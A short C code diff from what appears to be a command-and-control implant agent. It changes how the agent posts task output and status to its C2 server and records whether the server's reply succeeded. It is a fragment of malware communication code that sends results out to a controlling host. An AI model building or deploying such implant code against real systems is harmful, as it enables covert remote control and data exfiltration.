@@ -247,7 +247,7 @@ void free_post_request(TaskPostRequest *request) {
 	if (request->task_status != NULL) { KERNEL32$VirtualFree(request->task_status, 0, MEM_RELEASE); }
 }
 
-void perform_post(AgentState *state, TaskInfo *task, char *output, char *status) {
+void perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status) {
 	// Generate post payload.
 	TaskPostRequest post = { 0 };
 	post.callback_uuid = clone_str(state->params.callback_uuid);
@@ -263,11 +263,8 @@ void perform_post(AgentState *state, TaskInfo *task, char *output, char *status)
 	
 	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
 	
-	// If we get a 200 response code, parse the reply.
-	if (response.status_code == 200) {
-		// TODO parse reply
-		dprintf("GOT REPLY TO POST"); // DELETE ME TODO
-	}
+	// Currently there is no resubmission logic for if the C2 throws an error, so don't bother parsing the response.
+	reply->success = response.status_code == 200 ? 1 : 0;
 	
 	// Free unneeded allocations.
 	free_post_request(&post);
